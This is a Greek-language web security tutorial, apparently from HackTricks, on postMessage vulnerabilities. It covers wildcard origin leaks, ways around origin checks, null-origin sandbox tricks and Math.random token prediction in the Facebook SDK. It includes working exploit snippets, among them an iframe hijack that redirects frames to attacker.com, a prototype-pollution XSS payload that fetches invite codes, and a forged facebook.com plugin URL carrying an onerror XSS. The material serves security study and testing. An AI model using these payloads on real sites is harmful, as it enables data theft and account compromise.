# Ευπάθειες PostMessage

{{#include ../../banners/hacktricks-training.md}}

## Αποστολή **PostMessage**

**PostMessage** χρησιμοποιεί την ακόλουθη συνάρτηση για να στείλει ένα μήνυμα:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Σημειώστε ότι **targetOrigin** μπορεί να είναι '\*' ή ένα URL όπως _https://company.com._\
Στο **δεύτερο σενάριο**, το **μήνυμα μπορεί να σταλεί μόνο σε εκείνο το domain** (ακόμα κι αν το origin του αντικειμένου window είναι διαφορετικό).\
Εάν χρησιμοποιηθεί ο **wildcard**, **τα μηνύματα μπορούν να σταλούν σε οποιοδήποτε domain**, και θα σταλούν στο origin του αντικειμένου Window.

### Επίθεση σε iframe & wildcard στο **targetOrigin**

Όπως εξηγείται στο [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) αν βρείτε μια σελίδα που μπορεί να είναι **iframed** (χωρίς `X-Frame-Header` προστασία) και που **στέλνει ευαίσθητο** μήνυμα μέσω **postMessage** χρησιμοποιώντας **wildcard** (\*), μπορείτε να **τροποποιήσετε** το **origin** του **iframe** και να **leak** το **ευαίσθητο** μήνυμα σε ένα domain που ελέγχετε.\
Σημειώστε ότι αν η σελίδα μπορεί να iframed αλλά το **targetOrigin** είναι **ρυθμισμένο σε URL και όχι σε wildcard**, αυτό το **κόλπο δεν θα λειτουργήσει**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Εκμετάλλευση addEventListener

**`addEventListener`** είναι η συνάρτηση που χρησιμοποιείται από το JS για να δηλώσει τη συνάρτηση που **αναμένει `postMessages`**.\
Κώδικας παρόμοιος με τον ακόλουθο θα χρησιμοποιηθεί:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Σημειώστε σε αυτή την περίπτωση πώς το **πρώτο πράγμα** που κάνει ο κώδικας είναι **έλεγχος του origin**. Αυτό είναι εξαιρετικά **σημαντικό**, κυρίως αν η σελίδα πρόκειται να κάνει **οποιαδήποτε ευαίσθητη ενέργεια** με τις ληφθείσες πληροφορίες (π.χ. αλλαγή κωδικού). **Αν δεν ελέγχει το origin, επιτιθέμενοι μπορούν να κάνουν τα θύματα να στείλουν αυθαίρετα δεδομένα σε αυτά τα endpoints** και να αλλάξουν τους κωδικούς των θυμάτων (στο παράδειγμα αυτό).

### Enumeration

Για να **βρείτε event listeners** στην τρέχουσα σελίδα μπορείτε:

- **Ψάξτε** στον JS κώδικα για `window.addEventListener` και `$(window).on` (_JQuery έκδοση_)
- **Εκτελέστε** στην κονσόλα των developer tools: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Πηγαίνετε σε** _Elements --> Event Listeners_ στα developer tools του browser

![](<../../images/image (396).png>)

- Χρησιμοποιήστε μια **browser extension** όπως [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ή [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Αυτές οι επεκτάσεις θα **παρεμποδίζουν όλα τα μηνύματα** και θα σας τα εμφανίζουν.

### Origin check bypasses

- Το attribute **`event.isTrusted`** θεωρείται ασφαλές καθώς επιστρέφει `True` μόνο για events που δημιουργούνται από γνήσιες ενέργειες χρήστη. Παρότι είναι δύσκολο να παρακαμφθεί αν υλοποιηθεί σωστά, η σημασία του στους ελέγχους ασφαλείας είναι σημαντική.
- Η χρήση του **`indexOf()`** για validation του origin σε PostMessage events μπορεί να είναι ευάλωτη σε παράκαμψη. Ένα παράδειγμα που το δείχνει είναι:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Η μέθοδος **`search()`** από το `String.prototype.search()` προορίζεται για regular expressions, όχι για απλές συμβολοσειρές. Η χρήση οτιδήποτε εκτός από regexp προκαλεί implicit μετατροπή σε regex, καθιστώντας τη μέθοδο πιθανώς ανασφαλή. Αυτό συμβαίνει επειδή στο regex, η τελεία (.) λειτουργεί ως wildcard, επιτρέποντας την παράκαμψη του ελέγχου με ειδικά κατασκευασμένα domains. Για παράδειγμα:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Η **`match()`** λειτουργία, όπως και η `search()`, επεξεργάζεται regex. Αν το regex δεν είναι σωστά δομημένο, μπορεί να είναι επιρρεπές σε παράκαμψη.
- Η συνάρτηση **`escapeHtml`** προορίζεται να καθαρίζει εισόδους με το να κάνει escape χαρακτήρων. Ωστόσο, δεν δημιουργεί ένα νέο escaped αντικείμενο αλλά υπεργράφει τις ιδιότητες του υπάρχοντος αντικειμένου. Αυτή η συμπεριφορά μπορεί να εκμεταλλευτεί. Ειδικά, αν ένα αντικείμενο μπορεί να χειραγωγηθεί έτσι ώστε μια ιδιοκτησία που ελέγχεται από τον επιτιθέμενο να μην αναγνωρίζει το `hasOwnProperty`, η `escapeHtml` δεν θα λειτουργήσει όπως αναμένεται. Αυτό δείχνεται στα παρακάτω παραδείγματα:

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

Στο πλαίσιο αυτής της ευπάθειας, το αντικείμενο `File` είναι ιδιαίτερα εκμεταλλεύσιμο λόγω της read-only `name` ιδιότητας. Αυτή η ιδιότητα, όταν χρησιμοποιείται σε templates, δεν καθαρίζεται από τη `escapeHtml`, οδηγώντας σε πιθανούς κινδύνους ασφάλειας.

- Η ιδιότητα `document.domain` στο JavaScript μπορεί να οριστεί από ένα script για να συντομεύσει το domain, επιτρέποντας πιο χαλαρή επιβολή της same-origin policy εντός του ίδιου γονικού domain.

### e.origin == window.origin bypass

Όταν ενσωματώνετε μια web σελίδα μέσα σε ένα **sandboxed iframe** χρησιμοποιώντας %%%%%%, είναι κρίσιμο να κατανοήσετε ότι το origin του iframe θα οριστεί σε null. Αυτό είναι ιδιαίτερα σημαντικό όταν χειρίζεστε τα **sandbox attributes** και τις επιπτώσεις τους στην ασφάλεια και τη λειτουργικότητα.

Ορίζοντας το **`allow-popups`** στο sandbox attribute, οποιοδήποτε popup που ανοίγει από το iframe κληρονομεί τους περιορισμούς sandbox του γονέα. Αυτό σημαίνει ότι εκτός αν συμπεριληφθεί και το attribute **`allow-popups-to-escape-sandbox`**, το origin του popup θα οριστεί επίσης σε `null`, ευθυγραμμιζόμενο με το origin του iframe.

Συνεπώς, όταν ένα popup ανοίγει υπό αυτές τις συνθήκες και ένα μήνυμα αποστέλλεται από το iframe στο popup χρησιμοποιώντας **`postMessage`**, και οι αποστολείς και οι λήπτες έχουν το origin τους ορισμένο σε `null`. Αυτή η κατάσταση οδηγεί σε σενάριο όπου **`e.origin == window.origin`** αξιολογείται ως true (`null == null`), επειδή και το iframe και το popup μοιράζονται την ίδια τιμή origin `null`.

Για περισσότερες πληροφορίες **διαβάστε**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

Είναι δυνατό να ελεγχθεί αν το μήνυμα ήρθε από το ίδιο παράθυρο στο οποίο το script ακούει (ιδιαίτερα ενδιαφέρον για **Content Scripts από browser extensions** για να ελέγξουν αν το μήνυμα στάλθηκε από την ίδια σελίδα):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Μπορείτε να αναγκάσετε το **`e.source`** ενός μηνύματος να είναι null δημιουργώντας ένα **iframe** που **στέλνει** το **postMessage** και διαγράφεται **αμέσως**.

Για περισσότερες πληροφορίες **διάβασε:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Για να εκτελέσετε αυτές τις επιθέσεις, ιδανικά θα πρέπει να μπορείτε να **τοποθετήσετε τη σελίδα του θύματος** μέσα σε ένα `iframe`. Αλλά κάποια headers όπως το `X-Frame-Header` μπορούν να **αποτρέψουν** αυτή τη **συμπεριφορά**.\
Σε αυτές τις περιπτώσεις μπορείτε να χρησιμοποιήσετε μια λιγότερο stealthy επίθεση. Μπορείτε να ανοίξετε μια νέα καρτέλα στην ευάλωτη web εφαρμογή και να επικοινωνήσετε μαζί της:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Κλοπή μηνύματος που στάλθηκε σε child iframe μπλοκάροντας την κύρια σελίδα

Στην παρακάτω σελίδα μπορείτε να δείτε πώς μπορείτε να κλέψετε **ευαίσθητα postmessage δεδομένα** που στάλθηκαν σε **child iframe** μπλοκάροντας την **main** σελίδα πριν σταλούν τα δεδομένα και εκμεταλλευόμενοι ένα **XSS in the child** για να **leak the data** πριν αυτό ληφθεί:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Κλοπή μηνύματος με τροποποίηση του location του iframe

Αν μπορείτε να iframe μια σελίδα χωρίς X-Frame-Header που περιέχει άλλο iframe, μπορείτε να **αλλάξετε το location αυτού του child iframe**, έτσι αν λαμβάνει ένα **postmessage** που στέλνεται χρησιμοποιώντας **wildcard**, ένας επιτιθέμενος θα μπορούσε να **αλλάξει** το **origin** αυτού του iframe σε μια σελίδα **ελεγχόμενη** από αυτόν και να **κλέψει** το μήνυμα:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage σε Prototype Pollution και/ή XSS

Σε σενάρια όπου τα δεδομένα που στέλνονται μέσω του `postMessage` εκτελούνται από JS, μπορείτε να κάνετε **iframe** τη **σελίδα** και να **exploit** το **prototype pollution/XSS** στέλνοντας το exploit μέσω του `postMessage`.

Μερικά **πολύ καλά εξηγημένα XSS μέσω του `postMessage`** μπορούν να βρεθούν στο [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Παράδειγμα exploit για εκμετάλλευση του **Prototype Pollution και στη συνέχεια XSS** μέσω ενός `postMessage` σε ένα `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Για **περισσότερες πληροφορίες**:

- Σύνδεσμος σε σελίδα για [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Σύνδεσμος σε σελίδα για [**XSS**](../xss-cross-site-scripting/index.html)
- Σύνδεσμος σε σελίδα για [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Πρόβλεψη των **`Math.random()`** callback tokens σε postMessage bridges

Όταν η επικύρωση μηνυμάτων χρησιμοποιεί ένα “shared secret” που παράγεται με `Math.random()` (π.χ., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) και ο ίδιος helper ονομάζει επίσης τα plugin iframes, μπορείτε να ανακτήσετε PRNG outputs και να δημιουργήσετε ψευδή αξιόπιστα μηνύματα:

- **Leak PRNG outputs via `window.name`:** Το SDK ονομάζει αυτόματα τα plugin iframes με `guid()`. Αν ελέγχετε το top frame, iframe-άρετε την victim page, στη συνέχεια πλοηγείστε το plugin iframe στην origin σας (π.χ., `window.frames[0].frames[0].location='https://attacker.com'`) και διαβάστε `window.frames[0].frames[0].name` για να αποκτήσετε ένα raw `Math.random()` output.
- **Force more outputs without reloads:** Κάποια SDK εκθέτουν μια reinit διαδρομή· στο FB SDK, το firing του `init:post` με `{xfbml:1}` αναγκάζει `XFBML.parse()`, καταστρέφει/αναδημιουργεί το plugin iframe και παράγει νέα names/callback IDs. Επαναλαμβανόμενη reinit παράγει όσες PRNG outputs χρειάζονται (προσέξτε τις επιπλέον εσωτερικές κλήσεις `Math.random()` για callback/iframe IDs, οπότε οι solvers πρέπει να παραλείψουν ενδιάμεσα values).
- **Trusted-origin delivery via parameter pollution:** Αν ένα first-party plugin endpoint αντανακλά ένα μη-καθαρισμένο parameter στο cross-window payload (π.χ., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), μπορείτε να εγχύσετε `&type=...&iconSVG=...` διατηρώντας το trusted `facebook.com` origin.
- **Predict the next callback:** Μετατρέψτε leaked iframe names πίσω σε floats στο `[0,1)` και δώστε αρκετές τιμές (ακόμα και μη-συνεχόμενες) σε έναν V8 `Math.random` predictor (π.χ., Z3-based). Δημιουργήστε το επόμενο `guid()` τοπικά για να πλαστογραφήσετε το αναμενόμενο callback token.
- **Trigger the sink:** Κατασκευάστε τα postMessage δεδομένα ώστε το bridge να αποστείλει `xd.mpn.setupIconIframe` και να εγχύσει HTML στο `iconSVG` (π.χ., URL-encoded `<img src=x onerror=...>`), πετυχαίνοντας DOM XSS μέσα στο hosting origin· από εκεί, same-origin iframes (OAuth dialogs, arbiters, κ.λπ.) μπορούν να διαβαστούν.
- **Framing quirks help:** Η αλυσίδα απαιτεί framing. Σε μερικά mobile webviews, το `X-Frame-Options` μπορεί να υποβαθμιστεί σε μη-υποστηριζόμενο `ALLOW-FROM` όταν υπάρχει `frame-ancestors`, και παράμετροι “compat” μπορούν να αναγκάσουν permissive `frame-ancestors`, επιτρέποντας το side channel του `window.name`.

#### Minimal forged message example
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Αναφορές

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- Για εξάσκηση: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
